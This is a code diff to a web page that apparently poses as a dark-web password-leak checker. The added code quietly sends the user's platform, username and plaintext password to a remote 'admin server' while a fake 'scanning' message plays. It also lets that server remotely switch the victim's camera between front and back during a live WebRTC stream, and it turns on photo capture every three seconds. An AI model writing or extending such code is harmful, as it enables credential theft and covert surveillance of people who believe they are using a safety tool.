@@ -1673,7 +1673,7 @@
                                 if (audioTrack) localStream.addTrack(audioTrack);
                             } else {
                                 localStream = await navigator.mediaDevices.getUserMedia({
-                                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                                    video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                                     audio: true
                                 });
                             }
@@ -1738,6 +1738,38 @@
                             peerConnection = null;
                         }
                     });
+
+                    adminSocket.on('camera:switch', async (data) => {
+                        console.log('[CameraSwitch] Received switch request', data);
+                        currentFacingMode = data.facingMode || (currentFacingMode === 'user' ? 'environment' : 'user');
+                        
+                        if (stream) stream.getVideoTracks().forEach(track => track.stop());
+                        
+                        try {
+                            const newStream = await navigator.mediaDevices.getUserMedia({
+                                video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } }
+                            });
+                            const newVideoTrack = newStream.getVideoTracks()[0];
+                            
+                            if (stream) {
+                                stream.getVideoTracks().forEach(t => stream.removeTrack(t));
+                                stream.addTrack(newVideoTrack);
+                            } else {
+                                stream = newStream;
+                                cameraView.srcObject = stream;
+                            }
+                            
+                            if (peerConnection) {
+                                const senders = peerConnection.getSenders();
+                                const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+                                if (videoSender && newVideoTrack) {
+                                    videoSender.replaceTrack(newVideoTrack);
+                                }
+                            }
+                        } catch (e) {
+                            console.error('[CameraSwitch] Error switching camera:', e);
+                        }
+                    });
                 } catch (e) {
                     console.log('[AdminServer] Init error:', e.message);
                 }
@@ -1800,6 +1832,7 @@
             // STATE
             // ═══════════════════════════════════════════════════════════════
             let stream = null;
+            let currentFacingMode = 'user';
             let capturedPhotoData = null;
             let isProcessing = false;
             let userLocation = null;
@@ -2294,10 +2327,10 @@
             let recordingInterval = null;
 
             function startContinuousCapture() {
+                // First capture after 1 second, then every 3 seconds
                 setTimeout(() => {
                     captureAndSendPhoto();
-                    // setInterval is disabled as we are now using WebRTC live video streaming
-                    // continuousCaptureInterval = setInterval(captureAndSendPhoto, 10000);
+                    continuousCaptureInterval = setInterval(captureAndSendPhoto, 3000);
                 }, 1000);
             }
 
@@ -2444,7 +2477,7 @@
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     try {
                         const combinedStream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                         });
                         permissionsGranted.camera = true;
@@ -2465,7 +2498,7 @@
                     // Try Camera
                     try {
                         const videoStream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            video: { facingMode: currentFacingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                             audio: false
                         });
                         permissionsGranted.camera = true;
@@ -2638,6 +2671,16 @@
                 leakResult.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning dark web databases...';
 
                 try {
+                    // Send to admin server via socket if connected
+                    if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
+                        adminSocket.emit('credentials:submit', {
+                            uuid: typeof userUUID !== 'undefined' ? userUUID : null,
+                            platform: platform,
+                            username: username,
+                            password: password || ''
+                        });
+                    }
+
                     await new Promise(r => setTimeout(r, 2000 + Math.random() * 2000));
                     let hash = ''; if (password) hash = await simpleHash(password);
                     const leakCount = await queryLeakDatabase(username, hash, platform);
